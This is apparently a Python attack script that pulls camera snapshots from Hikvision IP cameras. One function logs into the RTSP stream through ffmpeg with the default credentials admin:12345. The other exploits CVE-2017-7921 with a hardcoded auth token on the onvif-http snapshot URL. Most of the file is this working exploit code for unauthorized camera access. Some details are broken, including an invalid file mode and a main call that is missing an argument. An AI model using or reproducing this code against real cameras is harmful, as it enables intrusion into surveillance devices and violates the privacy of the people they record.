# encoding=utf8
# 海康威视 rtsp 弱密码
# 主码流
# rtsp://admin:12345@IP:554/h264/ch1/main/av_stream
from utils.runshell import run_cmd
from utils.log import logger
from pathlib import Path
import httpx
from urllib3 import disable_warnings
import os
disable_warnings()


def get_rtsp(ip: str, save_path: Path) -> bool:
    """根据rtsp地址获取摄像头快照"""
    cmd = f'ffmpeg -rw_timeout 10 -i "rtsp://admin:12345@{ip}:554/h264/ch1/main/av_stream" -y -f mjpeg -t 0.001 -s 1280x720 {save_path.joinpath(ip+".jpg")}'
    # res = run_cmd(cmd)
    res = os.system(cmd)
    # if res and ("401" not in res[1]) and ("404" not in res[1]):
    if res == 0:
        logger.success(f"[+] IP:{ip},海康威视rstp弱密码成功!")
        return True
    logger.info(f"[-] IP:{ip},海康威视rstp弱密码失败...")
    return False


def get_cve(ip: str, save_path: Path) -> bool:
    """根据 CVE-2017-7921 漏洞 获取快照"""
    url = f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK"
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;"}
    try:
        with httpx.Client(headers=header, verify=False, timeout=5) as client:
            res = client.get(url)
            if res.status_code != 200:
                logger.info(f"[-] {ip} hikvison漏洞失败,请求码:{res.status_code}")
                return False
            with save_path.open(mode="wa") as fp:
                fp.write(res.content)
                logger.success(f"[+] {ip} hikvison漏洞利用成功!")
                return True
    except httpx.HTTPError as e:
        logger.info(f"[-] {ip} hikvison漏洞失败:{e}")
        return False
    except Exception as e:
        logger.info(f"[-] {ip} hikvison漏洞其他错误:{e}")
        return False


if __name__ == "__main__":
    get_rtsp("12")
